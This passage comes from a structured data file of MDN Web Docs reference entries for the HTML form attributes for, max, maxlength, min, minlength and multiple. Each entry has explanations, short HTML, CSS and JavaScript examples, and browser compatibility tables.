  description: "# HTML attribute: for\n\nThe `for` attribute is an allowed attribute for [`<label>`](../element/label) and [`<output>`](../element/output). When used on a `<label>` element it indicates the form element that this label describes. When used on an `<output>` element it allows for an explicit relationship between the elements that represent values which are used in the output.\n\n## Try it\n\n#### HTML Demo: for\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>\n      <label>First Name (no \"for\" attribute):</label>\n      <input id=\"first\" type=\"text\" value=\"Jane\" />\n    </p>\n    <p>\n      <label for=\"last\">Last Name (w/ \"for\" attribute):</label>\n      <input id=\"last\" type=\"text\" value=\"Doe\" />\n    </p>\n    <p id=\"result\">\n      <strong id=\"result-label\">Full Name:</strong>\n      <output for=\"first last\" aria-labelledby=\"result-label\" id=\"output\"></output>\n    </p>\n\n    label[for='paragraph'] {\n      color: rebbeccapurple;\n    }\n\n    #result {\n      text-align: center;\n    }\n\n    #result-label {\n      font-size: 16pt;\n    }\n\n    #result-label,\n    #output {\n      display: block;\n    }\n\n    const firstNameEl = document.getElementById('first');\n    const lastNameEl = document.getElementById('last');\n    const outputEl = document.getElementById('output');\n\n    function updateOutput() {\n      const value = `${firstNameEl.value} ${lastNameEl.value}`;\n      outputEl.innerText = value;\n    }\n\n    updateOutput();\n    firstNameEl.addEventListener('input', updateOutput);\n    lastNameEl.addEventListener('input', updateOutput);\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Usage\n\nWhen used as an attribute of `<label>`, the `for` attribute has a value which is the `id` of the form element it relates to.\n\nhtml\n\n```\n<label for=\"username\">Your name</label> <input type=\"text\" id=\"username\" />\n```\n\nWhen used as an attribute of `<output>`, the `for` attribute has a value which is a space separated list of the `id` values of the elements which are used to create the output.\n\nhtml\n\n```\n<input type=\"range\" id=\"b\" name=\"b\" value=\"50\" /> +\n<input type=\"number\" id=\"a\" name=\"a\" value=\"10\" /> =\n<output name=\"result\" for=\"a b\">60</output>\n```\n\n## Examples\n\nSee examples of usage on the element pages for [`<label>`](../element/label) and [`<output>`](../element/output).\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|       | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|       | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `for` | 10      | ≤18  | 4       | 11    | 7      | 18             | 4                   | 11            | 7             | 1.0              | 4.4             |     |\n\n|       | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|       | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `for` | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n\n### html.elements.label.for\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.output.for\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/for](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/for)"
- name: Attributes.max
  summary: The max attribute defines the maximum value that is acceptable and valid for the input containing the attribute
  description: "# HTML attribute: max\n\nThe `max` attribute defines the maximum value that is acceptable and valid for the input containing the attribute. If the [`value`](../element/input#value) of the element is greater than this, the element fails [validation](https://developer.mozilla.org/en-US/docs/Learn/Forms/Form_validation). This value must be greater than or equal to the value of the [`min`](min) attribute. If the `max` attribute is present but is not specified or is invalid, no `max` value is applied. If the `max` attribute is valid and a non-empty value is greater than the maximum allowed by the `max` attribute, constraint validation will prevent form submission.\n\nValid for the numeric input types, including the [date](../element/input/date), [month](../element/input/month), [week](../element/input/week), [time](../element/input/time), [datetime-local](../element/input/datetime-local), [number](../element/input/number) and [range](../element/input/range) types, and both the [`<progress>`](../element/progress) and [`<meter>`](../element/meter) elements, the `max` attribute is a number that specifies the most positive value a form control to be considered valid.\n\nIf the value exceeds the max value allowed, the [`validityState.rangeOverflow`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/rangeOverflow) will be true, and the control will be matched by the [`:out-of-range`](https://developer.mozilla.org/en-US/docs/Web/CSS/:out-of-range) and [`:invalid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:invalid) pseudo-classes.\n\n## Syntax\n\n| Input type                                        | Syntax                                                                | Example                                                |\n|---------------------------------------------------|-----------------------------------------------------------------------|--------------------------------------------------------|\n| [date](../element/input/date)                     | `yyyy-mm-dd`                                                          | `<input type=\"date\" max=\"2019-12-25\" step=\"1\">`        |\n| [month](../element/input/month)                   | `yyyy-mm`                                                             | `<input type=\"month\" max=\"2019-12\" step=\"12\">`         |\n| [week](../element/input/week)                     | `yyyy-W##`                                                            | `<input type=\"week\" max=\"2019-W23\" step=\"\">`           |\n| [time](../element/input/time)                     | `hh:mm`                                                               | `<input type=\"time\" max=\"17:00\" step=\"900\">`           |\n| [datetime-local](../element/input/datetime-local) | `yyyy-mm-ddThh:mm`                                                    | `<input type=\"datetime-local\" max=\"2019-12-25T23:59\">` |\n| [number](../element/input/number)                 | [\\<number\\>](https://developer.mozilla.org/en-US/docs/Web/CSS/number) | `<input type=\"number\" min=\"0\" step=\"5\" max=\"100\">`     |\n| [range](../element/input/range)                   | [\\<number\\>](https://developer.mozilla.org/en-US/docs/Web/CSS/number) | `<input type=\"range\" min=\"60\" step=\"5\" max=\"100\">`     |\n\nSyntax for `max` values by input `type`\n\n**Note:** When the data entered by the user doesn't adhere to the maximum value set, the value is considered invalid in constraint validation and will match the [`:invalid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:invalid) and [`:out-of-range`](https://developer.mozilla.org/en-US/docs/Web/CSS/:out-of-range) pseudo-classes.\n\nSee [Client-side validation](../constraint_validation) and [`rangeOverflow`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/rangeOverflow) for more information.\n\nFor the [`<progress>`](../element/progress) element, the `max` attribute describes how much work the task indicated by the `progress` element requires. If present, must have a value greater than zero and be a valid floating point number. For the [`<meter>`](../element/meter) element, the `max` attribute defines the upper numeric bound of the measured range. This must be greater than the minimum value ([`min`](min) attribute), if specified. In both cases, if omitted, the value defaults to 1.\n\n| Input type                          | Syntax                                                                | Example                                                                                            |\n|-------------------------------------|-----------------------------------------------------------------------|----------------------------------------------------------------------------------------------------|\n| [`<progress>`](../element/progress) | [\\<number\\>](https://developer.mozilla.org/en-US/docs/Web/CSS/number) | `<progress id=\"file\" max=\"100\" value=\"70\"> 70% </progress>`                                        |\n| [`<meter>`](../element/meter)       | [\\<number\\>](https://developer.mozilla.org/en-US/docs/Web/CSS/number) | `<meter id=\"fuel\" min=\"0\" max=\"100\" low=\"33\" high=\"66\" optimum=\"80\" value=\"40\"> at 40/100</meter>` |\n\nSyntax for `max` values for other elements\n\n## Accessibility concerns\n\nProvide instructions to help users understand how to complete the form and use individual form controls. Indicate any required and optional input, data formats, and other relevant information. When using the `max` attribute, ensure this maximum requirement is understood by the user. Providing instructions within the [`<label>`](../element/label) may be sufficient. If providing instructions outside of labels, which allows more flexible positioning and design, consider using [`aria-labelledby`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-labelledby) or [`aria-describedby`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-describedby).\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|       | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|       | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `max` | 6       | 12   | 6       | 11    | 6      | 18             | 6                   | 11            | 7             | 1.0              | 4.4             |     |\n\n|       | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|       | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `max` | 6       | ≤18  | 16      | 11    | 6      | 18             | 16                  | 11            | 10.3          | 1.0              | No              |     |\n\n|       | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|       | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `max` | 4       | 12   | 16      | ≤12.1 | 5      | 18             | 16                  | ≤12.1         | 4             | 1.0              | ≤37             |     |\n\n### html.elements.input.max\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.meter.max\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.progress.max\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n## See also\n\n- [`step`](step)\n- [`min`](min)\n- other meter attributes: [`low`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/low), [`high`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/high), [`optimum`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/optimum)\n- [Constraint validation](../constraint_validation)\n- [Form validation](https://developer.mozilla.org/en-US/docs/Learn/Forms/Form_validation)\n- [`validityState.rangeOverflow`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/rangeOverflow)\n- [`:out-of-range`](https://developer.mozilla.org/en-US/docs/Web/CSS/:out-of-range)\n- [`<input>`](../element/input)\n- [date](../element/input/date), [month](../element/input/month), [week](../element/input/week), [time](../element/input/time), [datetime-local](../element/input/datetime-local), [number](../element/input/number) and [range](../element/input/range) types, and the [`<meter>`](../element/meter)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/max](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/max)"
- name: Attributes.maxlength
  summary: The maxlength attribute defines the maximum string length that the user can enter into an <input> or <textarea>
  description: "# HTML attribute: maxlength\n\nThe `maxlength` attribute defines the maximum [string length](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/length) that the user can enter into an [`<input>`](../element/input) or [`<textarea>`](../element/textarea). The attribute must have an integer value of 0 or higher.\n\nThe length is measured in UTF-16 code units, which ([for most scripts](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/length#strings_with_length_not_equal_to_the_number_of_characters)) is equivalent to the number of characters. If no `maxlength` is specified, or an invalid value is specified, the input has no maximum length.\n\nAny `maxlength` value must be greater than or equal to the value of [`minlength`](minlength), if present and valid. The input will fail constraint validation if the length of the text value of the field is greater than maxlength UTF-16 code units long. Constraint validation is only applied when the value is changed by the user.\n\n### Constraint validation\n\nWhile the browser will generally prevent user from entering more text than the maxlength attribute allows, should the length be longer than the maxlength allows, the read-only [`tooLong`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/tooLong) property of a [`ValidityState`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState) object will be true.\n\n## Try it\n\n#### HTML Demo: maxlength\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <label for=\"name\">Product name:</label>\n    <input id=\"name\" name=\"name\" type=\"text\" value=\"Shampoo\" minlength=\"3\" maxlength=\"20\" required />\n\n    <label for=\"description\">Product description:</label>\n    <textarea id=\"description\" name=\"description\" minlength=\"10\" maxlength=\"40\" required></textarea>\n\n    label {\n      display: block;\n      margin-top: 1em;\n    }\n\n    input:valid,\n    textarea:valid {\n      background-color: palegreen;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Examples\n\nhtml\n\n```\n<input type=\"password\" maxlength=\"4\" />\n```\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n|             | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|             | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `maxlength` | 1       | 12   | 1       | ≤12.1 | 1      | 18             | 4                   | ≤12.1         | 1             | 1.0              | 4.4             |     |\n\n### html.elements.input.maxlength\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.textarea.maxlength\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n## See also\n\n- [`minlength`](minlength)\n- [`size`](size)\n- [`pattern`](pattern)\n- [Constraint validation](../constraint_validation)\n- [Form validation](https://developer.mozilla.org/en-US/docs/Learn/Forms/Form_validation)\n- [`<input>`](../element/input)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/maxlength](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/maxlength)"
- name: Attributes.min
  summary: The min attribute defines the minimum value that is acceptable and valid for the input containing the attribute
  description: "# HTML attribute: min\n\nThe `min` attribute defines the minimum value that is acceptable and valid for the input containing the attribute. If the [`value`](../element/input#value) of the element is less than this, the element fails [validation](https://developer.mozilla.org/en-US/docs/Learn/Forms/Form_validation). This value must be less than or equal to the value of the `max` attribute.\n\nSome input types have a default minimum. If the input has no default minimum and a value is specified for `min` that can't be converted to a valid number (or no minimum value is set), the input has no minimum value.\n\nIt is valid for the input types including: [date](../element/input/date), [month](../element/input/month), [week](../element/input/week), [time](../element/input/time), [datetime-local](../element/input/datetime-local), [number](../element/input/number) and [range](../element/input/range) types, and the [`<meter>`](../element/meter) element.\n\n## Syntax\n\n| Input type                                        | Syntax                                                                | Example                                                |\n|---------------------------------------------------|-----------------------------------------------------------------------|--------------------------------------------------------|\n| [date](../element/input/date)                     | `yyyy-mm-dd`                                                          | `<input type=\"date\" min=\"2019-12-25\" step=\"1\">`        |\n| [month](../element/input/month)                   | `yyyy-mm`                                                             | `<input type=\"month\" min=\"2019-12\" step=\"12\">`         |\n| [week](../element/input/week)                     | `yyyy-W##`                                                            | `<input type=\"week\" min=\"2019-W23\" step=\"\">`           |\n| [time](../element/input/time)                     | `hh:mm`                                                               | `<input type=\"time\" min=\"09:00\" step=\"900\">`           |\n| [datetime-local](../element/input/datetime-local) | `yyyy-mm-ddThh:mm`                                                    | `<input type=\"datetime-local\" min=\"2019-12-25T19:30\">` |\n| [number](../element/input/number)                 | [\\<number\\>](https://developer.mozilla.org/en-US/docs/Web/CSS/number) | `<input type=\"number\" min=\"0\" step=\"5\" max=\"100\">`     |\n| [range](../element/input/range)                   | [\\<number\\>](https://developer.mozilla.org/en-US/docs/Web/CSS/number) | `<input type=\"range\" min=\"60\" step=\"5\" max=\"100\">`     |\n\nSyntax for `min` values by input `type`\n\n**Note:** When the data entered by the user doesn't adhere to the min value set, the value is considered invalid in constraint validation and will match the [`:invalid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:invalid) and [`:out-of-range`](https://developer.mozilla.org/en-US/docs/Web/CSS/:out-of-range) pseudo-classes.\n\nSee [Client-side validation](../constraint_validation) and [`rangeUnderflow`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/rangeUnderflow) for more information.\n\nFor the [`<meter>`](../element/meter) element, the `min` attribute defines the lower numeric bound of the measured range. This must be less than the maximum value ([`max`](max) attribute), if specified. In both cases, if omitted, the value defaults to 1.\n\n| Input type                    | Syntax                                                                | Example                                                                                            |\n|-------------------------------|-----------------------------------------------------------------------|----------------------------------------------------------------------------------------------------|\n| [`<meter>`](../element/meter) | [\\<number\\>](https://developer.mozilla.org/en-US/docs/Web/CSS/number) | `<meter id=\"fuel\" min=\"0\" max=\"100\" low=\"33\" high=\"66\" optimum=\"80\" value=\"40\"> at 40/100</meter>` |\n\nSyntax for `min` values for other elements\n\n### Impact on step\n\nThe value of `min` and `step` define what are valid values, even if the `step` attribute is not included, as `step` defaults to `0`.\n\nWe add a big red border around invalid inputs:\n\ncss\n\n```\ninput:invalid {\n  border: solid red 3px;\n}\n```\n\nThen define an input with a minimum value of 7.2, omitting the step attribute, wherein it defaults to 1.\n\nhtml\n\n```\n<input id=\"myNumber\" name=\"myNumber\" type=\"number\" min=\"7.2\" value=\"8\" />\n```\n\nBecause `step` defaults to 1, valid values include `7.2`, `8.2`, `9.2`, and so on. The value 8 is not valid. As we included an invalid value, supporting browsers will show the value as invalid.\n\nIf not explicitly included, `step` defaults to 1 for `number` and `range`, and 1 unit type (second, week, month, day) for the date/time input types.\n\n## Accessibility concerns\n\nProvide instructions to help users understand how to complete the form and use individual form controls. Indicate any required and optional input, data formats, and other relevant information. When using the `min` attribute, ensure this minimum requirement is understood by the user. Providing instructions within the [`<label>`](../element/label) may be sufficient. If providing instructions outside of labels, which allows more flexible positioning and design, consider using [`aria-labelledby`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-labelledby) or [`aria-describedby`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-describedby).\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|       | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|       | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `min` | 6       | ≤18  | 16      | 11    | 6      | 18             | 16                  | 11            | 10.3          | 1.0              | No              |     |\n\n|       | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|       | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `min` | 4       | 12   | 16      | ≤12.1 | 5      | 18             | 16                  | ≤12.1         | 4             | 1.0              | ≤37             |     |\n\n### html.elements.input.min\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.meter.min\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n## See also\n\n- [`step`](step)\n- [`max`](max)\n- other meter attributes: [`low`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/low), [`high`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/high), [`optimum`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/optimum)\n- [Constraint validation](../constraint_validation)\n- [Form validation](https://developer.mozilla.org/en-US/docs/Learn/Forms/Form_validation)\n- [`validityState.rangeUnderflow`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/rangeUnderflow)\n- [`:out-of-range`](https://developer.mozilla.org/en-US/docs/Web/CSS/:out-of-range)\n- [`<input>`](../element/input)\n- [date](../element/input/date), [month](../element/input/month), [week](../element/input/week), [time](../element/input/time), [datetime-local](../element/input/datetime-local), [number](../element/input/number) and [range](../element/input/range) types, and the [`<meter>`](../element/meter)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/min](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/min)"
- name: Attributes.minlength
  summary: The minlength attribute defines the minimum string length that the user can enter into an <input> or <textarea>
  description: "# HTML attribute: minlength\n\nThe `minlength` attribute defines the minimum [string length](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/length) that the user can enter into an [`<input>`](../element/input) or [`<textarea>`](../element/textarea). The attribute must have an integer value of 0 or higher.\n\nThe length is measured in UTF-16 code units, which ([for most scripts](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/length#strings_with_length_not_equal_to_the_number_of_characters)) is equivalent to the number of characters. If no `minlength` is specified, or an invalid value is specified, the input has no minimum length. This value must be less than or equal to the value of [maxlength](maxlength), otherwise the value will never be valid, as it is impossible to meet both criteria.\n\nThe input will fail constraint validation if the length of the text value of the field is less than minlength UTF-16 code units long, with [`validityState.tooShort`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/tooShort) returning `true`. Constraint validation is only applied when the value is changed by the user. Once submission fails, some browsers will display an error message indicating the minimum length required and the current length.\n\n`minlength` does not imply [`required`](required); an input only violates a `minlength` constraint if the user has input a value. If an input is not `required`, an empty string can be submitted even if `minlength` is set.\n\n## Try it\n\n#### HTML Demo: minlength\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <label for=\"name\">Product name:</label>\n    <input id=\"name\" name=\"name\" type=\"text\" value=\"Shampoo\" minlength=\"3\" maxlength=\"20\" required />\n\n    <label for=\"description\">Product description:</label>\n    <textarea id=\"description\" name=\"description\" minlength=\"10\" maxlength=\"40\" required></textarea>\n\n    label {\n      display: block;\n      margin-top: 1em;\n    }\n\n    input:valid,\n    textarea:valid {\n      background-color: palegreen;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Examples\n\nBy adding `minlength=\"5\"`, the value must either be empty or five characters or longer to be valid.\n\nhtml\n\n```\n<label for=\"fruit\">Enter a fruit name that is at least 5 letters long</label>\n<input type=\"text\" minlength=\"5\" id=\"fruit\" />\n```\n\nWe can use pseudoclasses to style the element based on whether the value is valid. The value will be valid as long as it is either null (empty) or five or more characters long. *Lime* is invalid, *lemon is valid*.\n\ncss\n\n```\ninput {\n  border: 2px solid currentcolor;\n}\ninput:invalid {\n  border: 2px dashed red;\n}\ninput:invalid:focus {\n  background-image: linear-gradient(pink, lightgreen);\n}\n```\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|             | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|             | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `minlength` | 40      | 17   | 51      | 27    | 10.1   | 40             | 51                  | 27            | 10.3          | 4.0              | 40              |     |\n\n|             | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|             | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `minlength` | 40      | 17   | 51      | 27    | 10.1   | 40             | 51                  | 27            | 10.3          | 4.0              | 40              |     |\n\n### html.elements.input.minlength\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.textarea.minlength\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n## See also\n\n- [`maxlength`](maxlength)\n- [`size`](size)\n- [`pattern`](pattern)\n- [Constraint validation](../constraint_validation)\n- [Form validation](https://developer.mozilla.org/en-US/docs/Learn/Forms/Form_validation)\n- [`<input>`](../element/input)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/minlength](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/minlength)"
- name: Attributes.multiple
  summary: The Boolean multiple attribute, if set, means the form control accepts one or more values
  description: "# HTML attribute: multiple\n\nThe Boolean `multiple` attribute, if set, means the form control accepts one or more values. Valid for the [email](../element/input/email) and [file](../element/input/file) input types and the [`<select>`](../element/select), the manner by which the user opts for multiple values depends on the form control.\n\n## Try it\n\n#### HTML Demo: multiple\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <label for=\"recipients\">Where should we send the receipt?</label>\n    <input id=\"recipients\" name=\"recipients\" type=\"email\" multiple />\n\n    <label for=\"shakes\">Which shakes would you like to order?</label>\n    <select id=\"shakes\" name=\"shakes\" multiple>\n      <option>Vanilla Shake</option>\n      <option>Strawberry Shake</option>\n      <option>Chocolate Shake</option>\n    </select>\n\n    <label for=\"payment\">How would you like to pay?</label>\n    <select id=\"payment\" name=\"payment\">\n      <option>Credit card</option>\n      <option>Bank Transfer</option>\n    </select>\n\n    label {\n      display: block;\n      margin-top: 1em;\n    }\n\n    input,\n    select {\n      width: 100%;\n    }\n\n    input:invalid {\n      background-color: lightpink;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Overview\n\nDepending on the type, the form control may have a different appearance if the `multiple` attribute is set. For the file input type, the native messaging the browser provides differs. In Firefox, the file input reads \"No files selected\" when the attribute is present and \"No file selected\" when it is not. Most browsers display a scrolling list box for a [`<select>`](../element/select) control with the `multiple` attribute set and a single line dropdown when the attribute is omitted. The [email](../element/input/email) input displays the same whether or not the `multiple` attribute is included, but will match the [`:invalid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:invalid) pseudo-class if more than one comma-separated email address is included if the attribute is not present.\n\nWhen `multiple` is set on the [email](../element/input/email) input type, the user can include zero (if not also [`required`](required)), one or more comma-separated email addresses.\n\nhtml\n\n```\n<input type=\"email\" multiple name=\"emails\" id=\"emails\" />\n```\n\nIf and only if the `multiple` attribute is specified, the value can be a list of properly-formed comma-separated email addresses. Any trailing and leading whitespace is removed from each address in the list.\n\nWhen `multiple` is set on the [file](../element/input/file) input type, the user can select one or more files. The user can choose multiple files from the file picker in any way that their chosen platform allows (e.g. by holding down Shift or Control, and then clicking).\n\nhtml\n\n```\n<input type=\"file\" multiple name=\"uploads\" id=\"uploads\" />\n```\n\nWhen the attribute is omitted, the user can only select a single file per `<input>`.\n\nThe `multiple` attribute on the [`<select>`](../element/select) element represents a control for selecting zero or more options from the list of options. Otherwise, the [`<select>`](../element/select) element represents a control for selecting a single [`<option>`](../element/option) from the list of options.\n\nhtml\n\n```\n<select multiple name=\"dwarfs\" id=\"dwarfs\">\n  <option>Grumpy</option>\n  <option>Happy</option>\n  <option>Sleepy</option>\n  <option>Bashful</option>\n  <option>Sneezy</option>\n  <option>Dopey</option>\n  <option>Doc</option>\n</select>\n```\n\nWhen `multiple` is specified, most browsers will show a scrolling list box instead of a single line dropdown.\n\n## Accessibility concerns\n\nProvide instructions to help users understand how to complete the form and use individual form controls. Indicate any required and optional input, data formats, and other relevant information. When using the `multiple` attribute, inform the user that multiple values are allowed and provide directions on how to provide multiple values, such as \"separate email addresses with a comma.\"\n\nSetting `size=\"1\"` on a multiple select can make it appear as a single select in some browsers, but then it doesn't expand on focus, harming usability. Don't do that. If you do change the appearance of a select, and even if you don't, make sure to inform the user that more than one option can be selected by another method.\n\n## Examples\n\n### email input\n\nhtml\n\n```\n<label for=\"emails\">Who do you want to email?</label>\n<input\n  type=\"email\"\n  multiple\n  name=\"emails\"\n  id=\"emails\"\n  list=\"dwarf-emails\"\n  required\n  size=\"64\" />\n\n<datalist id=\"dwarf-emails\">\n  <option value=\"grumpy@woodworkers.com\">Grumpy</option>\n  <option value=\"happy@woodworkers.com\">Happy</option>\n  <option value=\"sleepy@woodworkers.com\">Sleepy</option>\n  <option value=\"bashful@woodworkers.com\">Bashful</option>\n  <option value=\"sneezy@woodworkers.com\">Sneezy</option>\n  <option value=\"dopey@woodworkers.com\">Dopey</option>\n  <option value=\"doc@woodworkers.com\">Doc</option>\n</datalist>\n```\n\nIf and only if the `multiple` attribute is specified, the value can be a list of properly-formed comma-separated email addresses. Any trailing and leading whitespace is removed from each address in the list. If the [`required`](required) attribute is present, at least one email address is required.\n\nSome browsers support the appearance of the [`list`](../element/input#list) of options from the associated [`<datalist>`](../element/datalist) for subsequent email addresses when `multiple` is present. Others do not.\n\n### file input\n\nWhen `multiple` is set on the [file](../element/input/file) input type, the user can select one or more files:\n\nhtml\n\n```\n<form method=\"post\" enctype=\"multipart/form-data\">\n  <p>\n    <label for=\"uploads\"> Choose the images you want to upload: </label>\n    <input\n      type=\"file\"\n      id=\"uploads\"\n      name=\"uploads\"\n      accept=\".jpg, .jpeg, .png, .svg, .gif\"\n      multiple />\n  </p>\n  <p>\n    <label for=\"text\">Pick a text file to upload: </label>\n    <input type=\"file\" id=\"text\" name=\"text\" accept=\".txt\" />\n  </p>\n  <p>\n    <input type=\"submit\" value=\"Submit\" />\n  </p>\n</form>\n```\n\nNote the difference in appearance between the example with `multiple` set and the other `file` input without.\n\nWhen the form is submitted, had we used [`method=\"get\"`](../element/form) each selected file's name would have been added to URL parameters as `?uploads=img1.jpg&uploads=img2.svg`. However, since we are submitting multipart form data, we must use post. See the [`<form>`](../element/form) element and [sending form 